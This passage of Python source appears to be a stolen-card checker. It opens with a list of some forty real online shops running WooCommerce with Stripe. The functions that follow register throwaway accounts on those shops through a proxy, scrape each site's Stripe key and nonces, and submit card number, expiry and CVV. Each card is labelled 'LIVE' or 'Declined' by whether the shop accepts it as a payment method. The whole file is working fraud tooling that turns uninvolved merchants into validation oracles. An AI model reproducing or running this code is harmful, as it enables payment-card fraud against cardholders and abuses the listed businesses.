www.ihanalifestyle.com/my-account | Stripe | stripe | Auth : True
toodiees.com/my-account | Stripe | stripe_upm | Auth : True
www.fairlytrading.com/my-account | Stripe | stripe | Auth : True
infusefashion.com/my-account | Stripe | stripe_cc | Auth : True
fusolight.com/my-account | Stripe | woocommerce_payments | Auth : True
alarabmarket.com/my-account | Stripe | stripe | Auth : True
zayoautos.com/my-account | Stripe | stripe | Auth : True
lilyfarmfreshskincare.com/my-account | Stripe | woocommerce_payments | Auth : True
shop.dartzmotorz.com/my-account | Stripe | stripe | Auth : True
kitritual.com/my-account | Stripe | woocommerce_payments | Auth : True
poprose.com/my-account | Stripe | woocommerce_payments | Auth : True
www.skcaraudio.com/my-account | Stripe | stripe | Auth : True
rinolo.com/my-account | Stripe | ppcp-gateway | Auth : True
idflmobile.com/my-account | Stripe | woocommerce_payments | Auth : True
wemadeyoulaugh.com/my-account | Stripe | stripe | Auth : True
kaseyrogers.com/my-account | Stripe | woocommerce_payments | Auth : True
www.meloyogastudio.com/my-account | Stripe | stripe | Auth : True
pierrelucerne.com/my-account | Stripe | stripe_cc | Auth : True
shop.seeddesignusa.com/my-account | Stripe | woocommerce_payments | Auth : True
genesluggage.com/my-account | Stripe | stripe | Auth : True
nirvanamala.com/my-account | Stripe | stripe | Auth : True
glamgirlnails.com/my-account | Stripe | stripe | Auth : True
collectiblesandmoreinstore.com/my-account | Stripe | eh_stripe_pay | Auth : True
gamesti.com/my-account | Stripe | woocommerce_payments | Auth : True
www.thebeautyumbrella.com/my-account | Stripe | stripe | Auth : True
rainb.jdmsite.com/my-account | Stripe | stripe | Auth : True
thelyscollective.com/my-account | Stripe | woocommerce_payments | Auth : True
vesperaelux.com/my-account | Stripe | stripe_cc | Auth : True
uniquecustomt-shirts.com/my-account | Stripe | stripe | Auth : True
niftyhippieapothecary.com/my-account | Stripe | stripe | Auth : True
lensmart93.com/my-account-2 | Stripe | stripe_cc | Auth : True
jaxonje-sisterapparelandoils.com/my-account | Stripe | stripe_cc | Auth : True
annimateo.com/my-account | Stripe | woocommerce_payments | Auth : True
arbehypermall.com/my-account | Stripe | stripe | Auth : True
serval-atelier.com/my-account | Stripe | stripe | Auth : True
helveticahaus.com/my-account | Stripe | stripe | Auth : True
caf-corporation.com/my-account | Stripe | stripe | Auth : True
escustomtees.com/my-account-2 | Stripe | woocommerce_payments | Auth : True
sockbox.com/my-account | Stripe | stripe | Auth : True
www.piercysports.com/my-account | Stripe | woocommerce_payments | Auth : True
thefurrstlove.com/my-account | Stripe | stripe_cc | Auth : True
"""

def _parse_auth_sites_1(raw: str) -> list:
    sites = []
    for line in raw.strip().splitlines():
        line = line.strip()
        if not line or line.startswith('#'): continue
        if '|' in line:
            parts = [p.strip() for p in line.split('|')]
            if len(parts) >= 4 and 'true' in parts[3].lower() and parts[0]:
                sites.append(parts[0])
        else:
            sites.append(line)
    return sites

AUTH_SITES_1 = _parse_auth_sites_1(_AUTH_SITES_1_RAW)

def _load_auth_sites_1() -> list:
    try:
        with open('auth_sites_1.txt', 'r', encoding='utf-8') as f:
            raw = f.read()
        parsed = _parse_auth_sites_1(raw)
        if parsed: return parsed
    except: pass
    return AUTH_SITES_1

NONCE_PATTERNS = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
    r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'"nonce"\s*:\s*"([a-f0-9]+)"',
]
BAD_RESPONSES = {'', '0', 'null', 'false', '-1', 'undefined'}

def _is_bad_body(text):
    if text is None: return True
    return str(text).strip().lower() in BAD_RESPONSES

def _extract_error(text):
    for pat in [r'"decline_code"\s*:\s*"([^"]+)"',
                r'"message"\s*:\s*"([^"]+)"',
                r'"code"\s*:\s*"([^"]+)"']:
        m = re.search(pat, text)
        if m:
            return m.group(1).upper() if ('decline' in pat or 'code' in pat) else m.group(1)
    return ''

async def _auth_try_site(site_url, cc, mm, yy, cvv, proxy_url):
    if not site_url.startswith('http'):
        site_url = 'https://' + site_url
    try:
        p = urlparse(site_url)
        base = f'{p.scheme}://{p.netloc}'
        raw_path = p.path or ''
        account_path = (raw_path.rstrip('/') + '/') if raw_path else '/my-account/'
        if not account_path.startswith('/'): account_path = '/' + account_path
    except Exception:
        return {'Status': 'Error', 'Response': 'bad url', 'Card': f'{cc}|{mm}|{yy}|{cvv}'}

    site_domain = base.replace('https://', '').replace('http://', '')
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
    gu, mu, si = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
    headers_site = {'User-Agent': UA,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    proxy_arg = _proxy_url(proxy_url)
    timeout = aiohttp.ClientTimeout(total=20, connect=8)
    jar = aiohttp.CookieJar(unsafe=True)
    card_fmt = f'{cc}|{mm}|{yy}|{cvv}'
    step = 'init'

    try:
        async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:
            step = 'pk'
            stripe_pk = None
            for url in [f'{base}{account_path}add-payment-method/',
                        f'{base}{account_path}',
                        f'{base}/my-account/add-payment-method/',
                        f'{base}/checkout/', f'{base}/']:
                try:
                    async with session.get(url, headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=12) as resp:
                        text = await resp.text()
                        for pat in [r'pk_live_[a-zA-Z0-9]{20,}',
                                    r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"']:
                            m = re.search(pat, text)
                            if m:
                                stripe_pk = m.group(0) if pat.startswith(r'pk_live') else m.group(1)
                                break
                    if stripe_pk: break
                except: continue
            if not stripe_pk:
                return {'Status': 'Error', 'Response': 'no stripe pk', 'Card': card_fmt}

            step = 'register'
            reg_nonce = None; reg_url = None
            for url in [f'{base}{account_path}', f'{base}/my-account/', f'{base}/register/']:
                try:
                    async with session.get(url, headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=12) as resp:
                        page_text = await resp.text()
                    for pattern in [
                        r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                        r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                        r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"',
                    ]:
                        m = re.search(pattern, page_text)
                        if m: reg_nonce = m.group(1); break
                    if reg_nonce: reg_url = url; break
                except: continue
            if not reg_nonce:
                return {'Status': 'Error', 'Response': 'no reg nonce', 'Card': card_fmt}

            try:
                async with session.post(reg_url,
                                        data={'email': email,
                                              '_wp_http_referer': account_path,
                                              'register': 'Register',
                                              'woocommerce-register-nonce': reg_nonce},
                                        headers={'User-Agent': UA,
                                                 'Content-Type': 'application/x-www-form-urlencoded',
                                                 'Origin': base, 'Referer': reg_url},
                                        ssl=False, allow_redirects=True,
                                        proxy=proxy_arg, timeout=15) as resp:
                    await resp.text()
            except Exception as e:
                return {'Status': 'Error', 'Response': f'reg: {type(e).__name__}', 'Card': card_fmt}

            cookies = {c.key: c.value for c in jar}
            if not any('wordpress_logged_in' in k for k in cookies):
                return {'Status': 'Error', 'Response': 'reg failed (no cookie)', 'Card': card_fmt}

            step = 'nonce'
            nonce = None
            for url in [f'{base}{account_path}add-payment-method/',
                        f'{base}{account_path}payment-methods/',
                        f'{base}/my-account/add-payment-method/',
                        f'{base}/checkout/', f'{base}{account_path}']:
                try:
                    async with session.get(url, headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=12) as resp:
                        page_text = await resp.text()
                    for pattern in NONCE_PATTERNS:
                        m = re.search(pattern, page_text)
                        if m: nonce = m.group(1); break
                    if nonce: break
                except: continue
            if not nonce:
                return {'Status': 'Error', 'Response': 'no setup nonce', 'Card': card_fmt}

            step = 'stripe_pm'
            stripe_headers = {'Accept': 'application/json',
                              'Content-Type': 'application/x-www-form-urlencoded',
                              'Origin': 'https://js.stripe.com',
                              'Referer': 'https://js.stripe.com/',
                              'User-Agent': UA}
            stripe_data = (
                f'type=card&card[number]={cc}&card[cvc]={cvv}'
                f'&card[exp_year]={yy}&card[exp_month]={mm}'
                f'&allow_redisplay=unspecified'
                f'&billing_details[address][postal_code]=10080'
                f'&billing_details[address][country]=US'
                f'&billing_details[name]=John%20Doe'
                f'&billing_details[email]={email}'
                f'&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent'
                f'&referrer=https%3A%2F%2F{site_domain}'
                f'&time_on_page={random.randint(20000, 50000)}'
                f'&guid={gu}&muid={mu}&sid={si}&key={stripe_pk}'
                f'&_stripe_version=2024-06-20'
            )
            try:
                async with session.post('https://api.stripe.com/v1/payment_methods',
                                        data=stripe_data, headers=stripe_headers,
                                        ssl=False, proxy=proxy_arg, timeout=20) as resp:
                    stripe_text = await resp.text()
            except Exception as e:
                return {'Status': 'Error', 'Response': f'pm: {type(e).__name__}', 'Card': card_fmt}

            try:
                stripe_json = _json.loads(stripe_text)
            except:
                return {'Status': 'Error', 'Response': 'pm: bad json', 'Card': card_fmt}

            if 'error' in stripe_json:
                err = stripe_json['error']
                display = err.get('decline_code') or err.get('code') or err.get('message') or 'TOKENIZATION_FAILED'
                return {'Status': 'Declined ❌', 'Response': str(display)[:80],
                        'Card': card_fmt, 'Site': site_domain}

            pm_id = stripe_json.get('id', '')
            if not pm_id or not pm_id.startswith('pm_'):
                return {'Status': 'Error', 'Response': 'no pm_id', 'Card': card_fmt}

            step = 'confirm'
            confirm_headers = {'Accept': '*/*',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'X-Requested-With': 'XMLHttpRequest',
                               'User-Agent': UA, 'Origin': base,
                               'Referer': f'{base}{account_path}add-payment-method/'}
            confirm_data = {'action': 'create_and_confirm_setup_intent',
                            'wc-stripe-payment-method': pm_id,
                            'wc-stripe-payment-type': 'card',
                            '_ajax_nonce': nonce}
            result_text = ''
            for ep_url, ep_params, ep_data in [
                (f'{base}/', {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, confirm_data),
                (f'{base}/wp-admin/admin-ajax.php', {},
                 {**confirm_data, 'action': 'wc_stripe_create_and_confirm_setup_intent'}),
            ]:
                try:
                    async with session.post(ep_url, params=ep_params, headers=confirm_headers,
                                            data=ep_data, ssl=False,
                                            proxy=proxy_arg, timeout=20) as resp:
                        result_text = await resp.text()
                        if resp.status == 200 and not _is_bad_body(result_text):
                            break
                except: continue
            if _is_bad_body(result_text):
                return {'Status': 'Error', 'Response': 'confirm: no body', 'Card': card_fmt}

            rl = result_text.lower()
            err_msg = _extract_error(result_text)
            if any(k in rl for k in ['"success":true', '"status":"succeeded"',
                                     'payment method added', 'payment_method_added']):
                if 'decline' in rl or 'card_declined' in rl:
                    return {'Status': 'Declined ❌', 'Response': err_msg or 'CARD_DECLINED',
                            'Card': card_fmt, 'Site': site_domain}
                return {'Status': 'Approved ✅', 'Response': 'Payment method added — LIVE',
                        'Card': card_fmt, 'Site': site_domain}
            if any(k in rl for k in ['requires_action','authentication_required',
                                     '3d_secure','redirect_to_url']):
                return {'Status': 'Approved 3DS ✅', 'Response': '3DS required',
                        'Card': card_fmt, 'Site': site_domain}
            if any(k in rl for k in ['incorrect_cvc','insufficient_funds',
                                     'invalid_cvc','cvc_check_failed']):
                return {'Status': 'Approved CCN ✅', 'Response': err_msg or 'CCN LIVE',
                        'Card': card_fmt, 'Site': site_domain}
            if any(k in rl for k in ['card_declined','generic_decline','do_not_honor',
                                     'fraudulent','lost_card','stolen_card',
                                     'pickup_card','restricted_card']):
                return {'Status': 'Declined ❌', 'Response': err_msg or 'CARD_DECLINED',
                        'Card': card_fmt, 'Site': site_domain}
            if 'expired_card' in rl or 'expired' in rl:
                return {'Status': 'Declined ❌', 'Response': 'EXPIRED_CARD',
                        'Card': card_fmt, 'Site': site_domain}
            if err_msg:
                return {'Status': 'Declined ❌', 'Response': err_msg,
                        'Card': card_fmt, 'Site': site_domain}
            return {'Status': 'Error', 'Response': 'confirm: unrecognized', 'Card': card_fmt}
    except asyncio.TimeoutError:
        return {'Status': 'Error', 'Response': f'{step}: timeout', 'Card': card_fmt}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'{step}: {type(e).__name__}', 'Card': card_fmt}

async def _check_stripe_auth_core(card, proxy, sites_list):
    try:
        parts = card.strip().split('|')
        if len(parts) != 4:
            return {'Status': 'Error', 'Response': 'Invalid card format', 'Card': card}
        cc, mm, yy, cvv = [p.strip() for p in parts]
        if len(yy) == 2: yy = '20' + yy
        sites = list(sites_list); random.shuffle(sites)
        reasons = []
        for site_url in sites:
            try:
                r = await _auth_try_site(site_url, cc, mm, yy, cvv, proxy)
                if r and isinstance(r, dict):
                    if not ('Error' in r.get('Status', '') and 'no ' in r.get('Response', '')):
                        return r
                    reasons.append(f"{site_url.split('//')[-1][:14]}:{r.get('Response', '')[:22]}")
            except Exception as e:
                reasons.append(f"err:{type(e).__name__}")
        detail = ' | '.join(reasons[:3]) if reasons else 'no result'
        return {'Status': 'Error', 'Response': f'Auth: {detail}', 'Card': card}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'exception: {str(e)[:60]}', 'Card': card}

async def check_stripe_auth(card, proxy=None):
    return await _check_stripe_auth_core(card, proxy, AUTH_SITES)

async def check_stripe_auth_1(card, proxy=None):
    return await _check_stripe_auth_core(card, proxy, _load_auth_sites_1())